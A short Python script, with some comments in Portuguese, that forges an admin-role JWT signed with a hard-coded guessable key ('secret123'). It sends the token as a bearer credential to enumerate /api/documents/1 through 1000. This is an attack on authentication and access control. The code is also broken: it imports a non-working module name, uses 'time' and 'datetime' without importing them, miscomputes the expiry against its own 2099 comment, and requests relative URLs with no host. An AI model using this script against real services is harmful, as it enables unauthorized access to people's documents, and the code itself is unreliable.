import pyjwt
import os
from requests import Session

# Define a chave de criptografia (replace with your actual secret key)
SECRET_KEY = "secret123"  


def create_super_token():
    payload = {
        "role": "ADMIN", 
        "exp": int(time.mktime(datetime.date.today().timetuple() + datetime.timedelta(days=365 * 18)))  # Expira em 2099
    }
    token_string = pyjwt.encode(payload, SECRET_KEY, algorithm="HS256")  

    return token_string


def main():
    token = create_super_token()
    print(f"Super Token:\n{token}")

    session = Session()
    session.headers.update({'Authorization': f'Bearer {token}'} )

    for i in range(1, 1001):
        url = f"/api/documents/{i}" 
        response = session.get(url) 
        # Do something with the response if needed...  
        print(f"Request for id: {i} - Response status: {response.status_code}")

if __name__ == "__main__":
    main()
